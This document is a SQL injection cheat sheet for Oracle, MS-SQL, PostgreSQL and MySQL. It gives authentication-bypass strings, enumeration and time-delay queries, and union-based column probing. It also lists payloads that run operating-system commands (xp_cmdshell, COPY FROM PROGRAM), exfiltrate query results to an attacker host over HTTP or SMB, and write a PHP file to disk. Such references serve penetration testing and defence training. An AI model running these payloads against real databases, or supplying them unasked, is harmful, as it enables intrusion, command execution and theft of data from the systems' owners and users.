### test strings
```
'
"
`
' OR '1' = '1'
' OR '1' = '1' --
' OR '1' = '1' /*
' OR '1' = '1' #
" OR "1" = "1"
" OR "1" = "1" --
" OR "1" = "1" /*
" OR "1" = "1" #
```

### comment
```
Oracle:
--comment
MS-SQL, PostgreSQL:
--comment
/*comment*/
MySQL:
#comment
-- comment [Note the space after the double dash]
/*comment*/
```

### version
```
Oracle:
SELECT banner FROM v$version
SELECT version FROM v$instance
MS-SQL:
SELECT @@version
PostgreSQL:
SELECT version()
MySQL:
SELECT @@version
```

### database name
```
Oracle: 
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual
MS-SQL:
SELECT db_name()
SELECT @@servername
MySQL:
SELECT database()
```

### sleep
```
Oracle:
dbms_pipe.receive_message(('a'),10)
MS-SQL:
WAITFOR DELAY '0:0:03'
PostgreSQL:
SELECT pg_sleep(10)
MySQL:
SELECT sleep(10)
```

### current user's privilege
```
Oracle:
SELECT privilege FROM session_privs
MS-SQL:
SELECT grantee, table_name, privilege_type FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES
MySQL:
SELECT * FROM information_schema.user_privileges WHERE grantee = '[user]'
```

### OS commands
```
Oracle:https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#oracle  
MS-SQL:  
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmshell '<command>'  
PostgreSQL:  
CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM '<command>'  
MySQL (UDF):  
SELECT sys_eval('<command>')  
```

### list databases
```
Oracle:
SELECT DISTINCT owner FROM all_tables
PostgreSQL:
SELECT datname FROM pg_database
MS-SQL:
SELECT name FROM master..sysdatabases
MySQL:
SELECT schema_name FROM information_schema.schemata
```

### select tables
```
Oracle:
SELECT table_name FROM all_tables WHERE owner='<database>'
PostgreSQL:
SELECT table_name FROM information_schema.tables WHERE table_schema='<database>'
MS-SQL:
SELECT name FROM <database>..sysobjects
MySQL:
SELECT table_name FROM information_schema.tables WHERE table_schema='<database>'
```

### select columns
```
Oracle:
SELECT column_name FROM all_tab_columns WHERE owner='<database>' AND table_name='<table>'
PostgreSQL:
SELECT column_name FROM information_schema.columns WHERE table_schema='<database>' AND table_name='<table>'
MS-SQL:
SELECT <database>..syscolumns.name FROM <database>..syscolumns, <database>..sysobjects WHERE <database>..syscolumns.id=<database>..sysobjects.id AND <database>..sysobjects.name='<table>'
MySQL:
SELECT column_name FROM information_schema.columns WHERE table_schema='<database>' AND table_name='<table>'
```

### get content of column
```
Oracle:
SELECT <column> FROM <database>.<table>
PostgreSQL:
SELECT <column> FROM <database>.<table>
MS-SQL:
SELECT <column> FROM <database>..<table>
MySQL:
SELECT <column> FROM <database>.<table>
```

### data exfiltration (only one row)
```
Oracle (via HTTP):
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<rhost>/'||(<query>)||'/"> %remote;]>'),'/l') FROM dual
MS-SQL (via SMB):
declare @p varchar(1024); set @p=(<query> ORDER BY (SELECT NULL) OFFSET <number> ROWS FETCH NEXT 1 ROWS ONLY) ; EXEC('master..xp_dirtree "//<lhost>/'+@p+'"'
MySQL (via SMB - works only on windows):
set @p=(<query> LIMIT <number>,1) ; SELECT LOAD_FILE(concat('\\\\<lhost>\\',@p))
```

### write to file
```
MySQL:
SELECT '<phpCommand>' INTO OUTFILE '<path>/<file>.php'
```

### get amount of columns (MySQL):
```
foo' order by 10#
foo' order by 9#
```

### or
```
foo' union select null--
foo' union select null,null--
```

### find correct data type for columns
```
' union select 'a',null#
' union select null,'a'#
```

